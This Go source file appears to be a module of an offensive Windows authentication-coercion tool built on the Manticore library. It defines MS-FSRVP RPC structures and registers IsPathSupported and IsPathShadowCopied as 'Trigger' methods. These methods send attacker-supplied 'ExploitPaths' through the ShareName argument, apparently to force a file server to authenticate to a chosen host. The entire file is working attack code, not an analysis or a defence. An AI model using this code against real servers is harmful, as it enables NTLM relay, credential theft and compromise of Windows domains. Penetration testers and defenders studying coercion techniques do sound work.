package methods

import (
	FileServerVssAgent "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/a8e0653c-2744-4389-a61d-7373df8b2292/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
)

// --- Op 8: IsPathSupported ---

type isPathSupportedRequest struct {
	ShareName ndr.WSTR
}

func (*isPathSupportedRequest) Opnum() uint16 { return FileServerVssAgent.OpnumIsPathSupported }

type isPathSupportedResponse struct {
	SupportedByThisProvider ndr.BOOL
	OwnerMachineName        *ndr.WSTR `ndr:"unique"`
	Status                  ndr.DWORD `ndr:"retval"`
}

// --- Op 9: IsPathShadowCopied ---

type isPathShadowCopiedRequest struct {
	ShareName ndr.WSTR
}

func (*isPathShadowCopiedRequest) Opnum() uint16 { return FileServerVssAgent.OpnumIsPathShadowCopied }

type isPathShadowCopiedResponse struct {
	ShadowCopyPresent       ndr.BOOL
	ShadowCopyCompatibility int32
	Status                  ndr.DWORD `ndr:"retval"`
}

func fsrvpAccess() []Access {
	syntaxes := []syntax.SyntaxID{FileServerVssAgent.SyntaxID()}
	return []Access{
		{Transport: TransportNamedPipe, Pipe: FileServerVssAgent.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
	}
}

func registerFSRVP(r *Registry) {
	access := fsrvpAccess()
	paths := fsrvpPaths()

	r.Register(Method{
		Protocol: "MS-FSRVP", ProtocolLong: "File Server Remote VSS",
		Function: "IsPathSupported", Opnum: FileServerVssAgent.OpnumIsPathSupported,
		VulnerableArgs: []string{"ShareName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &isPathSupportedRequest{ShareName: ndr.WSTR(exploitPath)}
			var resp isPathSupportedResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-FSRVP", ProtocolLong: "File Server Remote VSS",
		Function: "IsPathShadowCopied", Opnum: FileServerVssAgent.OpnumIsPathShadowCopied,
		VulnerableArgs: []string{"ShareName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &isPathShadowCopiedRequest{ShareName: ndr.WSTR(exploitPath)}
			var resp isPathShadowCopiedResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
